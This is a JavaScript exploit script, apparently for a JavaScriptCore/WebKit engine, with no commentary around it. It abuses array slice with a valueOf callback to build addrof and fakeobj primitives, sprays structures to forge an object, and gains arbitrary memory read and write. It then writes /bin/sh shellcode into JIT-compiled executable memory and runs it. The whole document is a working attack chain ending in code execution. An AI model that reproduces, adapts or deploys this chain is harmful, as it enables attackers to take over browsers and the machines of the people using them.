var conversion_buffer = new ArrayBuffer(8)
var f64 = new Float64Array(conversion_buffer)
var i32 = new Uint32Array(conversion_buffer)

var BASE32 = 0x100000000
function f2i(f) {
    f64[0] = f
    return i32[0] + BASE32 * i32[1]
}

function i2f(i) {
    i32[0] = i % BASE32
    i32[1] = i / BASE32
    return f64[0]
}

var structs = [];
function sprayStructures() {
    for (var i = 0; i < 1000; i++) {
            var a = [13.37];
            a['prop'] = 13.37;
            a['prop' + i] = 13.37;
            structs.push(a);
        }
}

function addrof(obj){
    var a=[];
    for(var i=0;i<100;i++){
        a.push(i+0.123);
    }
    var b=a.slice(0,{
        valueOf:function(){
            a.length=0;
            //print(describe(a))
            var c=[obj];
            //print(describe(c))
            return 10;
        }
    });
    //print(describe(b))
    return f2i(b[4]);
}



function fakeobj(addr){
    var a=[];
    for(var i=0;i<100;i++){
        a.push(0x1337)
    }
    addr = i2f(addr);
    var b= a.slice(0,{
        valueOf:function(){
            a.length=0;
            var c=[addr]
            print(describe(a))
            print(describe(c))
            return 10;
        }
    });
    print(describe(b))
    return b[4];
}


sprayStructures()


var victim = structs[0x300];

var header_arrayDouble=i2f(0x0108210700000200-0x1000000000000)
var container={
    fake_header:header_arrayDouble,
    butterfly: victim
}

//print(describe(container))
container_addr=addrof(container);
hax = fakeobj(container_addr+0x10);

print(container_addr.toString(16));
print(describe(hax));
print(describe(victim));


//hax[1]= i2f(addrof(hax)+0x10)
//print(f2i(victim.prop).toString(16))

//ArrayWithDouble
var unboxed = [1.1]
unboxed[0]=3.3

//ArrayWithContigous
var boxed = [{}]

hax[1] = i2f(addrof(unboxed))
var shared = victim[1]
hax[1] = i2f(addrof(boxed))
victim[1] = shared;
print(describe(unboxed))
print(describe(boxed))


var stage2={
    addrof: function(obj){
        boxed[0]=obj;
        return f2i(unboxed[0])
    },
    fakeobj: function(addr){
        unboxed[0]=i2f(addr)
        return boxed[0]
    },
    read64:function(addr){
        hax[1]=i2f(addr+0x10)
        return this.addrof(victim.prop)
    },
    write64:function(addr,data){
        hax[1]=i2f(addr+0x10)
        victim.prop = this.fakeobj(data)
    },
    getJITFunction : function (){
        function target(num) {
            for (var i = 2; i < num; i++) {
                if (num % i === 0) {
                    return false;
                }
            }
            return true;
        }
        for (var i = 0; i < 1000; i++) {
                    target(i);
                }
        for (var i = 0; i < 1000; i++) {
                    target(i);
                }
        for (var i = 0; i < 1000; i++) {
                    target(i);
                }
        return target;
    },
    getRWXMem: function(){
        shellcodeFunc = this.getJITFunction()
        target_addr = this.read64(this.addrof(shellcodeFunc)+8*3)
        print(target_addr.toString(16))
        target_addr = this.read64(target_addr + 8*3)
        target_addr = this.read64(target_addr + 8*4)
        return [shellcodeFunc, target_addr]
    },
    injectShellcode : function (addr, shellcode){
        var theAddr = addr;
        for(var i=0, len=shellcode.length; i < len; i++){
            this.write64(target_addr+i, shellcode[i].charCodeAt());
        }
    },
    pwn:function(){
        shellcodeObj = this.getRWXMem();
        shellcode = "j;X\x99RH\xbb//bin/shST_RWT^\x0f\x05"
        this.injectShellcode(shellcodeObj[1], shellcode);
        var shellcodeFunc = shellcodeObj[0];
        shellcodeFunc();
    },

};

stage2.pwn()
